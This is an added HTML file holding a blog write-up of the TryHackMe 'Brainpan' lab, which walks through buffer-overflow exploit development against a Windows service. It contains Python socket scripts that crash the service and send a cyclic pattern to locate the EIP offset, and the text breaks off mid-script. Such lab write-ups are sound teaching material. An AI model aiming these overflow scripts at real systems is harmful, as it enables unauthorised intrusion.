@@ -1,0 +1,1044 @@
+<!DOCTYPE html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"
+><head>
+  <meta charset="utf-8" />
+  
+    <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>BrainPan-Tryhackme &middot; Trevor Saudi</title>
+    <meta name="title" content="BrainPan-Tryhackme &middot; Trevor Saudi" />
+  
+  <meta name="description" content="Portfolio/blog" />
+  
+  
+  
+  <link rel="canonical" href="https://trevorsaudi.com/posts/2021-04-05_brainpantryhackme/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.71883ab0661482cf6c7d29b8bdd1af3be3d2f1ea750e56a67846b7f64f41d19b8dc6d7047f48422ec8cbe4a0a412d551c8210307e2b93b1254cdbf7d8af216e0.css"
+    integrity="sha512-cYg6sGYUgs9sfSm4vdGvO&#43;PS8ep1DlameEa39k9B0ZuNxtcEf0hCLsjL5KCkEtVRyCEDB&#43;K5OxJUzb99ivIW4A=="
+  />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.badab316c9287a5a42a843e4eb45da65bb3d194a5a0f5fa4a3e516160e67df0b8c65f4f19a8e146436e29d583699e6cb41d6bbe99e05e1dbaa877763bad9f8e2.js" integrity="sha512-utqzFskoelpCqEPk60XaZbs9GUpaD1&#43;ko&#43;UWFg5n3wuMZfTxmo4UZDbinVg2mebLQda76Z4F4duqh3djutn44g=="></script>
+  
+    
+    
+    
+  
+  
+    
+    
+  
+  
+  
+    
+    <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.5ffdd39e73bd1438c0f4ff42f13915f067c633da22f60efa62139a4c51b972622badb1157d4aa4322634b55c8a2dc5ddfbd3917426df1c02d7b69362030197da.js" integrity="sha512-X/3TnnO9FDjA9P9C8TkV8GfGM9oi9g76YhOaTFG5cmIrrbEVfUqkMiY0tVyKLcXd&#43;9ORdCbfHALXtpNiAwGX2g==" data-copy="Copy" data-copied="Copied"></script>
+  
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="BrainPan-Tryhackme" />
+<meta property="og:description" content="Exploiting a buffer overflow vulnerability by analyzing a Windows executable." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://trevorsaudi.com/posts/2021-04-05_brainpantryhackme/" /><meta property="og:image" content="https://trevorsaudi.com/posts/2021-04-05_brainpantryhackme/images/1.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2021-04-05_brainpantryhackme/images/2.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2021-04-05_brainpantryhackme/images/3.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2021-04-05_brainpantryhackme/images/4.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2021-04-05_brainpantryhackme/images/5.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2021-04-05_brainpantryhackme/images/6.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-04-05T18:46:03+00:00" />
+<meta property="article:modified_time" content="2022-05-24T14:31:47+03:00" /><meta property="og:site_name" content="Trevor Saudi" />
+
+
+  <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://trevorsaudi.com/posts/2021-04-05_brainpantryhackme/images/1.png"/>
+
+<meta name="twitter:title" content="BrainPan-Tryhackme"/>
+<meta name="twitter:description" content="Exploiting a buffer overflow vulnerability by analyzing a Windows executable."/>
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "BrainPan-Tryhackme",
+    "headline": "BrainPan-Tryhackme",
+    
+    "abstract": "Exploiting a buffer overflow vulnerability by analyzing a Windows executable.",
+    "inLanguage": "en",
+    "url" : "https:\/\/trevorsaudi.com\/posts\/2021-04-05_brainpantryhackme\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Trevor Saudi"
+    },
+    "copyrightYear": "2021",
+    "dateCreated": "2021-04-05T18:46:03\u002b00:00",
+    "datePublished": "2021-04-05T18:46:03\u002b00:00",
+    
+    "dateModified": "2022-05-24T14:31:47\u002b03:00",
+    
+    "keywords": ["Machine","BOF"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "994"
+  }]
+  </script>
+
+
+  
+  <meta name="author" content="Trevor Saudi" />
+  
+    
+      <link href="https://github.com/trevorsaudi" rel="me" />
+    
+      <link href="https://www.linkedin.com/in/trevor-saudi-9275b8186" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+  
+  
+  
+  
+
+
+  
+  
+</head>
+<body
+    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 bg-neutral text-neutral-900 sm:px-14 md:px-24 lg:px-32 dark:bg-neutral-800 dark:text-neutral max-w-7xl"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 dark:bg-neutral-600 focus:translate-y-0"
+        href="#main-content"
+        ><span class="font-bold ltr:pr-2 rtl:pl-2 text-primary-600 dark:text-primary-400"
+          >&darr;</span
+        >Skip to main content</a
+      >
+    </div><header
+  class="flex justify-between py-6 font-semibold sm:items-center sm:py-10 text-neutral-900 dark:text-neutral print:hidden"
+>
+  
+  <div>
+    
+      
+    
+    
+
+  </div>
+  
+  
+    <nav>
+      <ul class="flex flex-col list-none sm:flex-row">
+        
+          <li
+            class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
+          >
+            <a
+              class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+              href="/"
+              title=""
+              >Home</a
+            >
+          </li>
+        
+          <li
+            class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
+          >
+            <a
+              class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+              href="/posts/"
+              title="Posts"
+              >Posts</a
+            >
+          </li>
+        
+          <li
+            class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
+          >
+            <a
+              class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+              href="/about/"
+              title=""
+              >About</a
+            >
+          </li>
+        
+          <li
+            class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
+          >
+            <a
+              class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+              href="/tags/"
+              title="Tags"
+              >Tags</a
+            >
+          </li>
+        
+        
+          <li
+            class="ltr:text-right rtl:text-left ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
+          >
+            <button
+              id="search-button"
+              class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+              title="Search (/)"
+            >
+              
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+          </li>
+        
+      </ul>
+    </nav>
+  
+</header>
+<div class="relative">
+      <main id="main-content" class="grow">
+  <article>
+    <header class="max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/"
+      ></a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline ">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/"
+      >Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/2021-04-05_brainpantryhackme/"
+      >BrainPan-Tryhackme</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        BrainPan-Tryhackme
+      </h1>
+      <div class="mt-8 mb-12 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2021-04-05 18:46:03.757 &#43;0000 UTC">5 April 2021</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+      </div>
+    </header>
+    <section class="flex flex-col max-w-full mt-0 prose lg:flex-row dark:prose-invert">
+      
+        <div class="order-first px-0 lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8 lg:order-last">
+          <div class="ltr:pl-5 rtl:pr-5 toc lg:sticky lg:top-10 print:hidden">
+            <details open class="mt-0 overflow-hidden rounded-lg rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 lg:mt-3">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 text-neutral-800 dark:text-neutral-100 lg:hidden bg-neutral-100 dark:bg-neutral-700"
+  >
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted ltr:border-l rtl:border-r rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 border-neutral-300 dark:border-neutral-600"
+  >
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#exploiting-a-buffer-overflow-vulnerability-by-analyzing-a-windows-executable">Exploiting a buffer overflow vulnerability by analyzing a Windows executable.</a>
+      <ul>
+        <li><a href="#enumeration">Enumeration</a></li>
+        <li><a href="#fuzzing">Fuzzing</a>
+          <ul>
+            <li><a href="#step-1-finding-the-size-of-the-crash">Step 1: Finding the size of the crash</a></li>
+            <li><a href="#step-2-finding-the-offset">Step 2: Finding the offset</a></li>
+            <li><a href="#step-3-controlling-the-eip">Step 3: Controlling the EIP</a></li>
+            <li><a href="#step-4-finding-the-bad-characters">Step 4: Finding the bad characters</a></li>
+            <li><a href="#step-5-finding-a-jmp-esp-instruction">Step 5: Finding a JMP ESP instruction</a></li>
+            <li><a href="#step-6-generating-shellcode">Step 6: Generating shellcode</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
+      <div class="min-w-0 min-h-0 max-w-prose">
+        <p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/1.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<h2 id="exploiting-a-buffer-overflow-vulnerability-by-analyzing-a-windows-executable" class="relative group">Exploiting a buffer overflow vulnerability by analyzing a Windows executable. <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploiting-a-buffer-overflow-vulnerability-by-analyzing-a-windows-executable" aria-label="Anchor">#</a></span></h2>
+<h3 id="enumeration" class="relative group">Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#enumeration" aria-label="Anchor">#</a></span></h3>
+<p>Perform a quick rustscan to view open ports.</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/2.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>Port our results to nmap.</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/3.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>Not much information but I tried opening them on my browser. Port 9999 gave nothing but 10000 opens up a website as shown below.</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/4.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>I bruteforced for some directories and found something interesting.</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/5.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>This directory contains an executable file which is the application running on port 9999.</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/6.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>Trying a netcat to port 9999. We get this password prompt.</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/7.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<h3 id="fuzzing" class="relative group">Fuzzing <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#fuzzing" aria-label="Anchor">#</a></span></h3>
+<p>We are working with a buffer overflow, so let us trying crashing the application running on port 9999</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/8.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>We indeed get a crashing confirming existence of a buffer overflow.</p>
+<p>Download the executable file and transfer it to your Windows VM. We will work with Immunity debugger.</p>
+<p>Run the application and try connecting to it using our VM’s IP.</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/9.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>We can test the connection using netcat. We get the connection back. Everything set up, let’s get hacking :)</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/10.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<h4 id="step-1-finding-the-size-of-the-crash" class="relative group">Step 1: Finding the size of the crash <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-1-finding-the-size-of-the-crash" aria-label="Anchor">#</a></span></h4>
+<p>We need to find the approximate number of bytes that crashed our application. Attach it to immunity debugger and we can write a python script to send some bytes to the application till it crashes.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">IP</span> <span class="o">=</span> <span class="s2">&#34;192.168.100.85&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="mi">9999</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">IP</span><span class="p">,</span><span class="n">PORT</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">100</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">buffer</span> <span class="o">=</span> <span class="n">buffer</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">100</span>
+</span></span></code></pre></div><p>Head over to immunity debugger and see that our application crashed</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/11.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>To calculate the size of the crash, right click on esp , follow in dump. Check the address where the As start and end</p>
+<p>
+
+
+
+  
+  
+  
+    <figure>
+      <img class="my-0 rounded-md" src="/posts/2021-04-05_brainpantryhackme/images/12.png#layoutTextWidth" alt="image" />
+      
+    </figure>
+  
+
+</p>
+<p>We get 2072. We will use this as the default length of bytes.</p>
+<p>Modify our script as follows.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">IP</span> <span class="o">=</span> <span class="s2">&#34;192.168.100.85&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="mi">9999</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">IP</span><span class="p">,</span><span class="n">PORT</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">total_length</span> <span class="o">=</span> <span class="mi">2072</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="n">total_length</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span></span></code></pre></div><h4 id="step-2-finding-the-offset" class="relative group">Step 2: Finding the offset <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-2-finding-the-offset" aria-label="Anchor">#</a></span></h4>
+<p>Next we need to find out the exact number of bytes within the total_length that actually cause the crash. We use msf pattern create and pattern offset.
+<code>/usr/bin/msf-pattern_create -l 2072</code></p>
+<p>Copy the result and modify our script as follows</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">IP</span> <span class="o">=</span> <span class="s2">&#34;192.168.100.85&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="mi">9999</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">IP</span><span class="p">,</span><span class="n">PORT</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">total_length</span> <span class="o">=</span> <span class="mi">2072</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span></span></code></pre></div><p>Run the script and note the value of the EIP</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/bin/msf-pattern_offset -l <span class="m">2072</span> -q <span class="m">35724134</span>                         
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Exact match at offset <span class="m">524</span>
+</span></span></code></pre></div><p>We get our offset at 524. This means we have exactly 524 bytes before we reach the EIP register</p>
+<h4 id="step-3-controlling-the-eip" class="relative group">Step 3: Controlling the EIP <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-3-controlling-the-eip" aria-label="Anchor">#</a></span></h4>
+<p>We modify our script as follows and observe the EIP register</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">IP</span> <span class="o">=</span> <span class="s2">&#34;192.168.100.85&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="mi">9999</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">IP</span><span class="p">,</span><span class="n">PORT</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
